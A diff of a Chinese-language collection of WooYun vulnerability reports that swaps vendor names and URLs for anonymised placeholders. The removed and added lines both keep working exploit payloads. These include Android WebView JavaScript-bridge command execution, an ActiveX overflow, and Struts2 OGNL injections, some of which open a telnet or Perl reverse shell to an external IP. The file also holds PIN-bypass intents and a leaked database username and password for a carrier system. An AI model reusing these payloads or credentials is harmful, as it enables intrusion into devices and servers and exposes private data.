@@ -16,7 +16,7 @@
 **标题**: 撸啊撸多玩盒子APP远程命令执行漏洞
 **原始类型**: 漏洞类型：远程代码执行
 **URL示例**: 
-  - `http://drops.wooyun.org/papers/548我的android系统是4.1.2function`
+  - `https://example.com/[已脱敏]`
 **洞察提取**:
 **Payload片段**:
   ```
@@ -33,12 +33,12 @@
 **标题**: dolphin zero APP远程代码执行漏洞
 **原始类型**: 漏洞类型：远程代码执行
 **URL示例**: 
-  - `http://drops.wooyun.org/papers/548`
+  - `https://example.com/[已脱敏]`
 **洞察提取**:
-  - 还是android webview接口问题问题产生原因详见：http://drops.wooyun.org/papers/548
+  - 还是android webview接口问题问题产生原因详见：https://example.com/[已脱敏]
 **Payload片段**:
   ```
-  android webview接口问题问题产生原因详见：http://drops.wooyun.org/p
+  android webview接口问题问题产生原因详见：https://example.com/[已脱敏]
   ```
   ```
   or (var obj in window) {if ("getClass" in window[obj
@@ -69,7 +69,7 @@
 ### 典型案例
 
 #### wooyun-2015-0145365
-**百度输入法安卓版存在远程获取信息控制用户行为漏洞（可恶意推入内容等4G网络内可找到目标）**
+**某搜索引擎输入法安卓版存在远程获取信息控制用户行为漏洞（可恶意推入内容等4G网络内可找到目标）**
 - 参数: `repo, apkpackagename, error, packagename, intent`
 - Payload: `oreign Address         State       PID/Program namet`
 
@@ -78,7 +78,7 @@
 - Payload: `org/papers/548<script>function execute(cmdArgs) {ret`
 
 #### wooyun-2011-01334
-**淘宝阿里旺旺远程ActiveX溢出0DAY**
+**某电商平台阿里旺旺远程ActiveX溢出0DAY**
 - Payload: `<script>var buffer = '';while (buffer.length < 1111) buff`
 
 ---
@@ -112,7 +112,7 @@
 - 参数: `id`
 
 #### wooyun-2015-092544
-**百度浏览器7.0.600 bdbrowser://协议泄露可读取历史列表等等**
+**某搜索引擎浏览器7.0.600 bdbrowser://协议泄露可读取历史列表等等**
 - 参数: `url`
 
 #### wooyun-2014-077978
@@ -131,7 +131,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 下载懦豹4G浏览器：http://4g.roboo.com/下载dex2jar和jd-gui
+**详情**: 下载懦豹4G浏览器：https://example.com/[已脱敏]
 
 **POC**: 搜索addJavascriptInterfaceNavigator接口漏洞构造一个写文件+弹窗的Exp：<html><head><title>test</title></head><body><script>function execute(testcmd){return Navigator.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/system/bin/sh","-c","echo 'Webview远程
 
@@ -175,7 +175,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 请参见WooYun: 腾讯点开QQ消息 执行本地文件、命令原理一样····阿普大大别见怪。。抄袭了你的思路
+**详情**: 请参见WooYun: 某互联网公司点开某互联网公司消息 执行本地文件、命令原理一样····阿普大大别见怪。。抄袭了你的思路
 
 **POC**: (见原文)
 
@@ -197,7 +197,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 安装完暴风影音  进入主界面的时候   在左下角有两个功能 （暴风游戏）（轻风频道）点击暴风游戏的的时候 ,弹出来一个提示！于是抓包研究了一番  !改包然后提交   ！我在服务器上传了一个文件  命名为:BF-BFGame.exe  并且看到文件被成功下载了！静待几秒！成功下载并且执行了远程下载的计算器！短视频下载地址: http://pan.baidu.com/s/1mg5u0o4
+**详情**: 安装完暴风影音  进入主界面的时候   在左下角有两个功能 （暴风游戏）（轻风频道）点击暴风游戏的的时候 ,弹出来一个提示！于是抓包研究了一番  !改包然后提交   ！我在服务器上传了一个文件  命名为:BF-BFGame.exe  并且看到文件被成功下载了！静待几秒！成功下载并且执行了远程下载的计算器！短视频下载地址: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -207,8 +207,8 @@
 ---
 
 ---
-### [wooyun-2011-01311] QQ旋风ActiveX控件栈溢出漏洞
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 远程代码执行
+### [wooyun-2011-01311] 某互联网公司旋风ActiveX控件栈溢出漏洞
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -219,9 +219,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞存在于QQIEHelper.dll中，对unicode编码的URL没有做有效的长度检测导致一个栈溢出漏洞，由于新版已加入/gs编译选项，即使能覆盖异常处理，但无法在函数返回前触发异常而获得控制权限。
+**详情**: 漏洞存在于某互联网公司IEHelper.dll中，对unicode编码的URL没有做有效的长度检测导致一个栈溢出漏洞，由于新版已加入/gs编译选项，即使能覆盖异常处理，但无法在函数返回前触发异常而获得控制权限。
 
-**POC**: <html><script language="javascript">url = "ftp://"for (var i = 0; i < 0x300; i ++){url += "\u4141\u4141";}var s = new ActiveXObject("QQIEHelper.QQRightClick.2");s.SendUrl4(url, "http://127.0.0.1", "test", "", 0, 0, "", "", "");</script></html>
+**POC**: <html><script language="javascript">url = "ftp://"for (var i = 0; i < 0x300; i ++){url += "\u4141\u4141";}var s = new ActiveXObject("某互联网公司IEHelper.某互联网公司RightClick.2");s.SendUrl4(url, "http://[IP已脱敏]", "test", "", 0, 0, "", "", "");</script></html>
 
 **绕过**: 编码绕过
 
@@ -309,7 +309,7 @@
 
 **详情**: 某年月日，打完LOL，是时候关一波机了，然后。。。某应用程序无响应- -哎？某些无响应没有被关闭，那是不是其他的都被关闭了呢？我们先来看看Windows的关机机制：System Signal -> Shutdown Process -> Power Off既然这样，那我们是不是可以捕获信号，趁各种杀软都gg了的时候干掉他们或执行代码or其他程序？MSDN告诉我们，Windows提供用于监测系统事件的API，比如关机和注销。此处正在写代码- -好了~，核心一句话，通过Cancel方法来阻止关机，然后执行测试。本地实测拦截成功。好的，然后插入自己的代码吧。想破坏就删程序，想过悄无声息得以后随意过主动就插证书，还可以远程执行脚本嘛~ 随意随意~ 先测试个破坏杀软吧。（插证书和删杀软需要管理权限，只是执行自定义代码不需要。）此处又在写代码- -Ok，改一下，kill掉文件就可以。测试机装的金山小卫
 
-**POC**: EXP源码，可下载测试。（C#.Net）（例子是金山卫士）GitHub：https://github.com/dstsmallbird/AVKiller测试代码居然要付费- - 我这么渣的代码就不挂上去了。。。
+**POC**: EXP源码，可下载测试。（C#.Net）（例子是金山卫士）GitHub：https://example.com/[已脱敏] - 我这么渣的代码就不挂上去了。。。
 
 **绕过**: 直接利用
 
@@ -383,8 +383,8 @@
 ---
 
 ---
-### [wooyun-2014-075003] 网易云音乐安卓客户端存在webview 代码执行漏洞
-**厂商**: 网易 | **年份**: 2014 | **类型**: 远程代码执行
+### [wooyun-2014-075003] 某互联网公司云音乐安卓客户端存在webview 代码执行漏洞
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -417,13 +417,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 浏览器来说这种问题还是需要修补的导出searchBoxJavaBridge_好像是跟google的搜索框相关的。在android 4.0手机上测试实际存在，4.2以上版本不存在function execute(cmdArgs){return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}测试页面:http://drops.wooyun.org/webview.html参见:http://drops.wooyun.org/papers/548
+**详情**: 浏览器来说这种问题还是需要修补的导出searchBoxJavaBridge_好像是跟google的搜索框相关的。在android 4.0手机上测试实际存在，4.2以上版本不存在function execute(cmdArgs){return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}测试页面:https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 需要把这个接口删除，调用removeJavascriptInterface方法http://blog.csdn.net/leehong2005/article/details/11808557
+**修复**: 需要把这个接口删除，调用removeJavascriptInterface方法https://example.com/[已脱敏]
 ---
 
 ---
@@ -461,7 +461,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 文件：CsswebLogin.ocx版本：1.0.0.9 & 1.0.0.8clsid:F43B35B7-C29A-453F-86E9-C37412269D62属性：SetPswStr
+**详情**: 文件：CsswebLogin.ocx版本：[IP已脱敏] & [IP已脱敏]clsid:F43B35B7-C29A-453F-86E9-C37412269D62属性：SetPswStr
 
 **POC**: Heap Spray,大家都懂得
 
@@ -483,7 +483,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://wooyun.org/bugs/wooyun-2010-094365在这个例子测试的时候，发现是没有webview远程代码执行的，但是今天发现更新了，顺手测试一下，发现多个接口存在问题啊！！最新版已经从11.1.4->11.1.5了
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 多个接口存在js注入等问题写文件exp：<html><head><title>test</title></head><body><script>function execute(testcmd){return Android.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/system/bin/sh","-c","echo 'Webview远程命令执行漏洞测试.' > /sdcard/paxmac.txt"])
 
@@ -493,8 +493,8 @@
 ---
 
 ---
-### [wooyun-2016-0171660] 中国联通某重要系统漏洞可以登录全国大量联通手机号进入网厅操作
-**厂商**: 中国联通 | **年份**: 2016 | **类型**: 系统/服务补丁不及时
+### [wooyun-2016-0171660] 某运营商某重要系统漏洞可以登录全国大量联通手机号进入网厅操作
+**厂商**: 某运营商 | **年份**: 2016 | **类型**: 系统/服务补丁不及时
 
 **元思考**: 触发信号: 认证接口
 
@@ -505,7 +505,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 所有联通用户均已躺枪...1. 中国联通某重要系统漏洞理论可以登录全国所有联通手机号进入网厅操作【亲测：18666666666】2. 可查询所有联通手机号码发送给10010的短信以及系统回复的短信内容【流量/积分/余额/WLAN密码等等】中国联通江西网站管理系统存在反序列化执行漏洞**.**.**.**:7001/efbadmin/
+**详情**: 所有联通用户均已躺枪...1. 某运营商某重要系统漏洞理论可以登录全国所有联通手机号进入网厅操作【亲测：18666666666】2. 可查询所有联通手机号码发送给10010的短信以及系统回复的短信内容【流量/积分/余额/WLAN密码等等】某运营商江西网站管理系统存在反序列化执行漏洞**.**.**.**:7001/efbadmin/
 
 **POC**: getshell：**.**.**.**:7001/uddi/unicome.jsp  wooyun收集关键配置信息：bms.url=jdbc:oracle:thin:@**.**.**.**:1525/ecombms.username=ltzbyytbms.password=l4t5z9b7t0yt收集到大量联通人员的账号密码 邮箱 手机号  社工的信息通过数据库操作还可找到更多邮箱账户及密码
 
@@ -527,7 +527,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: UC浏览器TV版(1.4.0.437)下载链接(官方)：http://tvb.uc.cn/存在安卓webview远程代码执行漏洞存在漏洞的接口：searchBoxJavaBridge_Console
+**详情**: UC浏览器TV版([IP已脱敏])下载链接(官方)：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -537,8 +537,8 @@
 ---
 
 ---
-### [wooyun-2013-035573] 百度音乐本地版（TTPlayer5.0）存在所处堆栈溢出可执行任意代码
-**厂商**: 百度 | **年份**: 2013 | **类型**: 远程代码执行
+### [wooyun-2013-035573] 某搜索引擎音乐本地版（TTPlayer5.0）存在所处堆栈溢出可执行任意代码
+**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -551,7 +551,7 @@
 
 **详情**: 
 
-**POC**: #!/usr/bin/pythonimport sys, time, os,zipfileimagefuzzer="A"*4096imagefuzzer1="A"skinxmltmp="<skin version=\"2\" name=\"fuck\" author=\"fucker\" url=\"http://fucker.com\" email=\"fucker@fucker.com\" transparent_color=\"#ff00ff\">\<player_window image=\"" + imagefuzzer1*512 + """ "><play position="8,
+**POC**: #!/usr/bin/pythonimport sys, time, os,zipfileimagefuzzer="A"*4096imagefuzzer1="A"skinxmltmp="<skin version=\"2\" name=\"fuck\" author=\"fucker\" url=\"https://example.com/[已脱敏]" email=\"fucker@fucker.com\" transparent_color=\"#ff00ff\">\<player_window image=\"" + imagefuzzer1*512 + """ "><play position="8,
 
 **绕过**: 直接利用
 
@@ -593,7 +593,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 产品分为aspx和jsp版本 jsp大部分用于govhttp://www.jinyuan.gov.cn/jyq/private/login.actionhttp://www.tyxd.gov.cn/gov/private/login.action关键词：private/login.action
+**详情**: 产品分为aspx和jsp版本 jsp大部分用于govhttps://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -615,7 +615,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 陕西省中小学学籍管理系统http://124.115.170.189/desktop/login/login.action存在ST2远程代码执行。
+**详情**: 陕西省中小学学籍管理系统http://[IP已脱敏]
 
 **POC**: 使用shack2 兄弟的Struts2漏洞利用工具其他的就不演示了。如果你不相信的话，我可以说一点边缘的佐证，这个学籍管理系统是15个虚拟机构建的集群，部署在那个所谓的云平台上。
 
@@ -625,8 +625,8 @@
 ---
 
 ---
-### [wooyun-2012-07813] 腾讯手机游戏某站远程代码执行漏洞
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 系统/服务补丁不及时
+### [wooyun-2012-07813] 某互联网公司手机游戏某站远程代码执行漏洞
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 系统/服务补丁不及时
 
 **元思考**: 触发信号: 功能测试
 
@@ -637,13 +637,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://tgdz.j.3g.qq.com/spywars/login.action?%28%27\u0023_memberAccess[\%27allowStaticMethodAccess\%27]%27%29%28meh%29=true&%28aaa%29%28%28%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003d\u0023foo%27%29%28\u0023foo\u003dnew%20java.lang.Boolean%28%22false%22%29%29%29&%28asdf%29%28%28%27\u0023rt.exec%28%22%20perl%20\u002ftmp\u002fspider\u005fbc%20183.20.164.224%2012345%20%22%
+**详情**: https://example.com/[已脱敏]]%27%29%28meh%29=true&%28aaa%29%28%28%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003d\u0023foo%27%29%28\u0023foo\u003dnew%20java.lang.Boolean%28%22false%22%29%29%29&%28asdf%29%28%28%27\u0023rt.exec%28%22%20perl%20\u002ftmp\u002fspider\u005fbc%20183.20.164.224%2012345%20%22%
 
-**POC**: ?('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('\u0023rt.exec(%22 telnet 183.20.164.224 12345 %22)')(\u0023rt \u003d@java.lang.Runtime@g
+**POC**: ?('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('\u0023rt.exec(%22 telnet [IP已脱敏] 12345 %22)')(\u0023rt \u003d@java.lang.Runtime@g
 
 **绕过**: 直接利用
 
-**修复**: 这个老漏洞了 官网补丁下行了,好像这个业务暂停了的,腾讯整理下吧.有小礼物么 me and @顺子
+**修复**: 这个老漏洞了 官网补丁下行了,好像这个业务暂停了的,某互联网公司整理下吧.有小礼物么 me and @顺子
 ---
 
 ---
@@ -681,7 +681,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 利用 http://xmp.down.sandai.net/kankan/ClickOnceX/KankanClickOnceX.application具体过程不公布了 希望尽快修复
+**详情**: 利用 https://example.com/[已脱敏] 希望尽快修复
 
 **POC**: (见原文)
 
@@ -747,13 +747,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 版本：2.3 大小：28M  更新日期:2015.02.04两处存在使用CreateProcess()函数创建新的进程及其主线程，对于CreateProcess函数，Window规定如果传入的启动程序名称和参 数中包含空格，那么这些名称和参数在传入给CreateProcess函数之前必须用双引号””进行包含，比如c:/program files/sub dir/program name，如果不用””包含，则Window可能会产生歧异。安装2345输入法时2345PinyinSvc.exe可信任路径代码执行漏洞和2345输入法的设置功能2345PinyinConfig.exe可信任路径代码执行漏洞参考：WooYun: 百度输入法调用CreateProcess函数漏洞
+**详情**: 版本：2.3 大小：28M  更新日期:2015.02.04两处存在使用CreateProcess()函数创建新的进程及其主线程，对于CreateProcess函数，Window规定如果传入的启动程序名称和参 数中包含空格，那么这些名称和参数在传入给CreateProcess函数之前必须用双引号””进行包含，比如c:/program files/sub dir/program name，如果不用””包含，则Window可能会产生歧异。安装2345输入法时2345PinyinSvc.exe可信任路径代码执行漏洞和2345输入法的设置功能2345PinyinConfig.exe可信任路径代码执行漏洞参考：WooYun: 某搜索引擎输入法调用CreateProcess函数漏洞
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 百度
+**修复**: 某搜索引擎
 ---
 
 ---
@@ -791,13 +791,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 参考:http://drops.wooyun.org/papers/548我的android系统是4.1.2function execute(cmdArgs){return share.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}
+**详情**: 参考:https://example.com/[已脱敏] execute(cmdArgs){return share.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}
 
 **POC**: 1,左上角,网页浏览方式2,接口已出
 
 **绕过**: 直接利用
 
-**修复**: 参见:http://drops.wooyun.org/papers/548解决方法:http://blog.csdn.net/leehong2005/article/details/11808557测试页面:http://drops.wooyun.org/webview.html调用removeJa
+**修复**: 参见:https://example.com/[已脱敏]
 ---
 
 ---
@@ -813,7 +813,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞出现在plus/outside.php第10行直接访问这个php，参数传入要包含的文件路径。调用方式：192.168.2.162/plus/outside.php?id=..https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/user/20131102/12915588183.JPG%00
+**详情**: 漏洞出现在plus/outside.php第10行直接访问这个php，参数传入要包含的文件路径。调用方式：[IP已脱敏]
 
 **POC**: 漏洞出现在首先构造一个jpg文件，里面写入要执行的代码然后通过上传形象照，将图片上传上去。然后找到图片的位置然后访问
 
@@ -859,7 +859,7 @@
 
 **详情**: WPS抢先版主程序wps.exe、wpp.exe、et.exe存在dll劫持风险，wps.exe在启动时会加载wpsrw.dll，wpp.exe在启动时会加载wpprw.dll和uofswr.dll,et在启动时会加载uofssrw.dll，这些dll在本地不存在，如果黑客将htm格式的文件加上上述对应的恶意dll打包放在一起，发给用户。诱使用户打开上述格式文件，就会执行恶意程序，危害较大。
 
-**POC**: 1、随便建个文件夹，再将证明漏洞的wpprw.dll与test.htm放在一起，用wps演示打开test.htm，就会加载wpsrw.dll，如下图：2、Poc见http://wydrops-wordpress.stor.sinaapp.com/uploads/2013/07/WPSTEST.zip
+**POC**: 1、随便建个文件夹，再将证明漏洞的wpprw.dll与test.htm放在一起，用wps演示打开test.htm，就会加载wpsrw.dll，如下图：2、Poc见https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -879,7 +879,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 222.249.250.195222.249.250.83118.122.124.188Elasticsearch代码执行国外就不例举了  通知也没人修北京信息科技大学ifLab云计算小组
+**详情**: [IP已脱敏]222.249.250.83118.122.124.188Elasticsearch代码执行国外就不例举了  通知也没人修北京信息科技大学ifLab云计算小组
 
 **POC**: (见原文)
 
@@ -967,7 +967,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://oa.my089.cn:7001/defaultroot/login.jsp
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -1043,8 +1043,8 @@
 ---
 
 ---
-### [wooyun-2015-0146592] 百度电视云远程安装/启动apk/桌面提示（进入wifi后的乐趣）
-**厂商**: 百度 | **年份**: 2015 | **类型**: 远程代码执行
+### [wooyun-2015-0146592] 某搜索引擎电视云远程安装/启动apk/桌面提示（进入wifi后的乐趣）
+**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -1055,9 +1055,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://192.168.1.8:9182/request?action=startapp&app=com.android.chrome  远程启动apphttp://192.168.1.8:9182/request?action=showtoast&content=文本内容http://192.168.1.8:9182/request?action=install&url=http://file-bak.liqucn.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/2015/qipai/qyw_1.4.7_2200126314.apk&name=123远程安装apk先下载然后会有安装提示。http://192.168.1.8:9182/request?action=appslist  列出先有apphttp://192
+**详情**: http://[IP已脱敏]  远程启动apphttp://[IP已脱敏]  列出先有apphttp://192
 
-**POC**: http://192.168.1.8:9182/request?action=showtoast&content=文本内容   发送提示信息http://192.168.1.8:9182/request?action=install&url=http://file-bak.liqucn.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/2015/qipai/qyw_1.4.7_2200126314.apk&name=123远程安装apk 会有提示http://192.168.1.8:9182/request?action=star
+**POC**: http://[IP已脱敏]   发送提示信息http://[IP已脱敏] 会有提示http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -1065,8 +1065,8 @@
 ---
 
 ---
-### [wooyun-2012-09299] QQ游戏Android客户端漏洞导致任意代码执行和密码泄漏
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 用户敏感数据泄漏
+### [wooyun-2012-09299] 某互联网公司游戏Android客户端漏洞导致任意代码执行和密码泄漏
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 用户敏感数据泄漏
 
 **元思考**: 触发信号: 功能测试
 
@@ -1077,9 +1077,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: QQ游戏Android客户端采用模块化设计，部分游戏以APK的行为下载到手机SD卡中，然后通过ClassLoader动态加载其中的classes.dex文件执行，从而运行不同的游戏。在这个设计中，存在两个问题：1. 保存在SD卡的文件可以被其他任意应用软件读写；2. 在动态加载存储在SD卡上的classes.dex文件之前，没有对其完整性做验证。因此，攻击者可以替换已经下载的游戏文件，替换后的代码将在用户启动该游戏时得以执行。特别的，如果攻击者对这些文件采用重打包技巧植入恶意代码或者对用户进行欺诈，可以展开进一步攻击，例如获得用户密码或者搜集本地隐私数据等。
+**详情**: 某互联网公司游戏Android客户端采用模块化设计，部分游戏以APK的行为下载到手机SD卡中，然后通过ClassLoader动态加载其中的classes.dex文件执行，从而运行不同的游戏。在这个设计中，存在两个问题：1. 保存在SD卡的文件可以被其他任意应用软件读写；2. 在动态加载存储在SD卡上的classes.dex文件之前，没有对其完整性做验证。因此，攻击者可以替换已经下载的游戏文件，替换后的代码将在用户启动该游戏时得以执行。特别的，如果攻击者对这些文件采用重打包技巧植入恶意代码或者对用户进行欺诈，可以展开进一步攻击，例如获得用户密码或者搜集本地隐私数据等。
 
-**POC**: 1. 关于SD卡文件可以任意读写，不再用代码证明，引用一下官方文档。在下列链接中：http://developer.android.com/guide/practices/security.html有提到：Files created on external storage, such as SD Cards, are globally readable and writable. Since external storage can be removed by the user and also modified by any application, applications should 
+**POC**: 1. 关于SD卡文件可以任意读写，不再用代码证明，引用一下官方文档。在下列链接中：https://example.com/[已脱敏] created on external storage, such as SD Cards, are globally readable and writable. Since external storage can be removed by the user and also modified by any application, applications should 
 
 **绕过**: 直接利用
 
@@ -1099,13 +1099,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 参考:http://drops.wooyun.org/papers/548我的android系统是4.1.2function execute(cmdArgs){return Android.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}
+**详情**: 参考:https://example.com/[已脱敏] execute(cmdArgs){return Android.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}
 
 **POC**: 1,进入“通知”界面,随便点击一个链接,再通过里面某一些功能就可以了。2,接口已出。
 
 **绕过**: 直接利用
 
-**修复**: 赶集网大公司不应该有这些低级漏洞参见:http://drops.wooyun.org/papers/548解决方法:http://blog.csdn.net/leehong2005/article/details/11808557测试页面:http://drops.wooyun.org/webvie
+**修复**: 赶集网大公司不应该有这些低级漏洞参见:https://example.com/[已脱敏]
 ---
 
 ---
@@ -1121,7 +1121,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 搜索特征：google:inurl:changLang.actionbaidu：AVCON6企业信息管理系统网络实例：61.153.10.88:8080/changLang.actionwww.avms.com.cn:8080/changLang.actionwww.hxjshy.com:8080/changLang.actionurl目录爬行：osmanage  phototemp  orgmanage  forspecial    userinfo   ordmanage  randertemphttp报文巡检：<tr><td align="right" valign="middle">选择语言</td><td align="left"><a href="changLang.action?request_locale=zh_CN" title="Chinese simplified">
+**详情**: 搜索特征：google:inurl:changLang.actionbaidu：AVCON6企业信息管理系统网络实例：[IP已脱敏]  phototemp  orgmanage  forspecial    userinfo   ordmanage  randertemphttp报文巡检：<tr><td align="right" valign="middle">选择语言</td><td align="left"><a href="changLang.action?request_locale=zh_CN" title="Chinese simplified">
 
 **POC**: (见原文)
 
@@ -1143,7 +1143,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、浏览器intent scheme 过滤不当，结合fragment注入绕过pin码poc如下：（详见http://drops.wooyun.org/papers/2893）<a href="intent:#Intent;S.:android:show_fragment=com.android.settings.ChooseLockPassword$ChooseLockPasswordFragment;B.confirm_credentials=false;launchFlags=0x00008000;SEL;action=android.settings.SETTINGS;end">16、bypass Pin android 3.0-4.3 （selector）</a>
+**详情**: 1、浏览器intent scheme 过滤不当，结合fragment注入绕过pin码poc如下：（详见https://example.com/[已脱敏] href="intent:#Intent;S.:android:show_fragment=com.android.settings.ChooseLockPassword$ChooseLockPasswordFragment;B.confirm_credentials=false;launchFlags=0x00008000;SEL;action=android.settings.SETTINGS;end">16、bypass Pin android 3.0-4.3 （selector）</a>
 
 **POC**: 2、uxss测试地址：uxss.sinaapp.com3、开启services应用后命令执行
 
@@ -1165,7 +1165,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://gosmstheme.goforandroid.com/GoThemeWeb/login/login!login.action
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -1198,7 +1198,7 @@
 
 ---
 ### [wooyun-2014-067661] 来往APP远程代码执行漏洞妹子我来了
-**厂商**: 阿里巴巴 | **年份**: 2014 | **类型**: 远程代码执行
+**厂商**: 某电商平台 | **年份**: 2014 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -1209,13 +1209,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 参考:http://drops.wooyun.org/papers/548我的android系统是4.1.2功能肯定多啊，反正妹子很重要!!!(我不会告诉你，认识了个妹子。)function execute(cmdArgs){return Native_Bridge_laiwang.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}
+**详情**: 参考:https://example.com/[已脱敏])function execute(cmdArgs){return Native_Bridge_laiwang.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);}
 
-**POC**: 1,先去妹子们的讨论区2,找个“好”帖子3,评论处回复测试页面:http://drops.wooyun.org/webview.html4,接口已出，自个处理吧，阿里巴巴。
+**POC**: 1,先去妹子们的讨论区2,找个“好”帖子3,评论处回复测试页面:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 参见:http://drops.wooyun.org/papers/548解决方法:http://blog.csdn.net/leehong2005/article/details/11808557测试页面:http://drops.wooyun.org/webview.html调用removeJa
+**修复**: 参见:https://example.com/[已脱敏]
 ---
 
 ---
@@ -1259,7 +1259,7 @@
 
 **绕过**: 直接利用
 
-**修复**: 打补丁可以参考：修复weblogic的JAVA反序列化漏洞的多种方法http://drops.wooyun.org/web/13470
+**修复**: 打补丁可以参考：修复weblogic的JAVA反序列化漏洞的多种方法https://example.com/[已脱敏]
 ---
 
 ---
@@ -1277,7 +1277,7 @@
 
 **详情**: 美图秀秀主程序XiuXiu.exe存在dll劫持风险，XiuXiu.exe在启动时会加载dwmapi.dll，这些dll在本地不存在，如果黑客将上述格式的媒体文件加上上述对应的恶意dll打包放在一起，发给用户。用户打开上述格式文件，就会执行恶意程序，危害较大。
 
-**POC**: 1、随便建个文件夹，再将证明漏洞的dwmapi.dll与test.png放在一起，打开test.png，就会加载dwmapi.dll，如下图：2、Poc见http://wydrops-wordpress.stor.sinaapp.com/uploads/2013/07/MeituPoc.zip
+**POC**: 1、随便建个文件夹，再将证明漏洞的dwmapi.dll与test.png放在一起，打开test.png，就会加载dwmapi.dll，如下图：2、Poc见https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -1307,8 +1307,8 @@
 ---
 
 ---
-### [wooyun-2015-0145718] 百度手机助手远程静默安装启动应用漏洞(3G/4G环境下远程种马)
-**厂商**: 百度 | **年份**: 2015 | **类型**: 远程代码执行
+### [wooyun-2015-0145718] 某搜索引擎手机助手远程静默安装启动应用漏洞(3G/4G环境下远程种马)
+**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -1319,9 +1319,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
